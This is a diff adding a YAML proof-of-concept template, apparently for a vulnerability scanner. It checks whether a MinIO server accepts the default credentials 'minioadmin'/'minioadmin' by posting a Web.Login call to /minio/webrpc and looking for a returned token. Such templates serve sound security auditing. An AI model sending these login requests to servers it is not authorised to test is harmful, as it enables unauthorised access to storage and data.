@@ -1,0 +1,30 @@
+name: yaml-poc-minio-minio-unsafe_config-CT-158034
+binding: 81849429-3fd8-4556-a871-627b54bb6c53
+detail:
+    author: system_user
+    vulnerability:
+        id: 7fdc52e7-5471-45bb-8141-9e98315e43df
+        level: high
+transport: http
+rules:
+    poc10:
+        request:
+            cache: true
+            method: POST
+            path: /minio/webrpc
+            headers:
+                Content-Type: application/json
+            body: '{"id":1,"jsonrpc":"2.0","params":{"username":"minioadmin","password":"minioadmin"},"method":"Web.Login"}'
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"uiVersion") && response.body.bcontains(b"token")
+    poc20:
+        request:
+            cache: true
+            method: POST
+            path: /minio/webrpc
+            headers:
+                Content-Type: application/json
+            body: '{"id":1,"jsonrpc":"2.0","params":{"username":"minioadmin","password":"minioadmin"},"method":"web.Login"}'
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"uiVersion") && response.body.bcontains(b"token")
+expression: poc10() || poc20()
